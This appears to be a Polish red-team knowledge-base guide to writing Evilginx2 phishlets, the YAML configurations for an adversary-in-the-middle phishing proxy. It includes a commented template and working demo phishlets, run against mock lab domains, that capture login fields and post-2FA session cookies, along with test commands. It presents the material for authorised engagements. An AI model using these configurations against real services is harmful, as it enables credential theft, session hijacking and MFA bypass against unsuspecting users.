---
title: "Phishlet — przewodnik pisania (Evilginx2)"
date: 2026-08-16
tags: [phishing, evilginx2, phishlet, aitm, redteam, edukacja]
status: guide
category: narzedzia
---

# Phishlet — przewodnik pisania (Evilginx2)

Phishlet = plik YAML opisujący flow logowania i nazwy ciasteczek sesji dla Evilginx2 (AiTM reverse proxy).
**Tylko do legalnych angażementów z pisemną zgodą** — nie do klonowania realnych serwisów bez upoważnienia.

Powiązane: [[Evilginx2_Lab]] · [[Narzedzia/Phishing_Deep_Dive]] · [[Narzedzia/Phishing_Toolkit]] · [[detections/AiTM_Detekcja]]

## Jak AiTM mapuje się na pola phishletu

1. Ofiara wchodzi na domenę **phish** (lookalike) → evilginx jest **reverse proxy**.
2. evilginx łączy się z domeną **origin** (prawdziwą) i przepisuje treść (sub_filters).
3. Ofiara loguje się **przez** evilginx → evilginx kopiuje **auth_tokens** (ciasteczka sesji, w tym post-2FA).
4. Login+hasło łapane z **credentials** (POST body).

## Pełny szablon (z komentarzami)

~~~yaml
min_ver: '3.0.0'

# 1) proxy_hosts — mapowanie domena phish -> domena origin (reverse proxy)
proxy_hosts:
  - phish_sub: ''          # subdomena domeny phish (lookalike); '' = apex
    orig_sub: ''           # subdomena domeny origin (prawdziwej)
    domain: 'example.com'  # domena origin
    session: true          # true = na tym hoście origin ustawia ciasteczka sesji
    is_landing: true       # true = to strona startowa flow logowania
    auto_filter: true      # auto-włącz sub_filters dla tego hosta

# 2) sub_filters — podmiana tekstu origin -> phish w odpowiedziach (HTML/JS/CSS)
sub_filters:
  - triggers_on: 'example.com'   # kiedy aktywne (domena origin)
    orig_sub: ''
    domain: 'example.com'
    search: 'example.com'        # co podmienić (najczęściej domena origin)
    replace: 'evil.example'      # na co (domena phish)
    mimes: ['text/html', 'text/javascript', 'application/json']

# 3) auth_tokens — CO przechwycić (ciasteczka sesji, post-2FA)
auth_tokens:
  - domain: '.example.com'       # UWAGA: z kropką (patrz niżej)
    keys: ['session', 'SSID']    # nazwy ciasteczek sesji do skopiowania

# 4) credentials — login/hasło z formularza (POST)
credentials:
  username:
    key: 'email'                 # nazwa pola w POST body
    search: '(.*)'               # regex na wartości
    type: 'post'                 # post | json
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

# 5) login — ścieżka formularza logowania
login:
  domain: 'example.com'
  path: '/login'
~~~

## Field-by-field

| Pole | Rola | Wymagane |
|------|------|----------|
| proxy_hosts | listuje hosty, które evilginx ma proxyować (phish_sub.orig_sub.domena) | tak |
| session: true | oznacza host, na którym origin ustawia ciasteczka sesji | tak (co najmniej 1) |
| is_landing: true | strona startowa — tu trafia ofiara po kliknięciu lure | tak (co najmniej 1) |
| sub_filters | search/replace treści (domena origin → phish) | opcjonalne |
| auth_tokens | ciasteczka sesji do skopiowania (klucz AiTM) | tak |
| credentials | pola login/hasło z POST/JSON | opcjonalne (ale warto) |
| login | domena+path formularza logowania | tak |

## Pułapka: auth_tokens.domain vs cookie Domain

Z kodu evilginx2 (core/http_proxy.go):

- Cookie **bez** atrybutu Domain → evilginx używa hosta origin jako domeny ciasteczka (BEZ kropki).
- Cookie **z** atrybutem Domain → evilginx **prependuje kropkę** (czyli .domena).

Dlatego auth_tokens.domain musi pasować do tej reguły. Dwie poprawne kombinacje:

| Cookie origin | auth_tokens.domain |
|---------------|--------------------|
| bez Domain (host-only) | domena (bez kropki) |
| Domain=example.com | .example.com (z kropką) |

> W moim demie to był właśnie błąd: mock ustawiał host-only cookie, a phishlet miał .mock.local → mismatch → brak przechwycenia. Po ustawieniu Domain=mock.local w mocku i .mock.local w phishlecie — pasuje.

## Minimalny działający phishlet (demo — własny cel)

Cel: własny mock login na mock.local (patrz [[Evilginx2_Lab]]).

~~~yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'mock.local', session: true, is_landing: true}
auth_tokens:
  - domain: '.mock.local'
    keys: ['session']
credentials:
  username: {key: 'email', search: '(.*)', type: 'post'}
  password: {key: 'password', search: '(.*)', type: 'post'}
login:
  domain: 'mock.local'
  path: '/login'
~~~

## Wariant z subdomeną + sub_filters (demo)

Pokazuje phish_sub / orig_sub (subdomeny) i podmianę treści.

~~~yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'sso', domain: 'mockcorp.local', session: true, is_landing: true}
sub_filters:
  - {triggers_on: 'mockcorp.local', orig_sub: 'sso', domain: 'mockcorp.local', search: 'sso.mockcorp.local', replace: 'login.evilcorp.local', mimes: ['text/html']}
auth_tokens:
  - domain: '.mockcorp.local'
    keys: ['sid']
credentials:
  username: {key: 'user', search: '(.*)', type: 'post'}
  password: {key: 'pass', search: '(.*)', type: 'post'}
login:
  domain: 'sso.mockcorp.local'
  path: '/auth'
~~~

Mapowanie: ofiara widzi login.evilcorp.local, evilginx proxyuje do sso.mockcorp.local i podmienia w HTML każdy string sso.mockcorp.local na login.evilcorp.local.

## Jak testować phishlet (workflow)

1. Własny mock origin (patrz mock_origin.py w [[Evilginx2_Lab]]) + cert self-signed.
2. /etc/hosts: domena phish → 127.0.0.1, domena origin → IP mocka.
3. evilginx: phishlets hostname N domena-phish; phishlets enable N; lures create N; lures get-url id.
4. Victim (curl/przeglądarka) klika lure → loguje się → sprawdź sessions.

## Zasady (authorized engagement)

1. Tylko z pisemną zgodą właściciela serwisu/klienta.
2. Domena phish = własna/kliencka; cert LE tylko na domeny, do których masz prawo.
3. Izolowany lab / wydzielona infra; czyść sessions po demie.
4. Nie przechowuj realnych ciasteczek/creds poza engagementem.
